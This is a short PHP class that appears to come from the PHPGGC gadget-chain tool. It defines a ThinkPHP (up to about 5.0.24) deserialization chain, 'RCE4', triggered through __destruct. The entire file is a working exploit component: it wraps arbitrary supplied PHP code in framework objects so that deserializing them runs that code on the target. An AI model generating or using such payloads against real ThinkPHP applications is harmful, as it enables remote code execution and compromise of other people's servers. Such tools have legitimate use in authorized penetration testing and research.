<?php

namespace GadgetChain\ThinkPHP;

class RCE4 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '? <= 5.0.24?';
    public static $vector = '__destruct';
    public static $author = '???';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];
        return new \think\process\pipes\Windows(
            [new \think\view\driver\Php(), 'display']
            , "<?php $code ?>"
        );
    }
}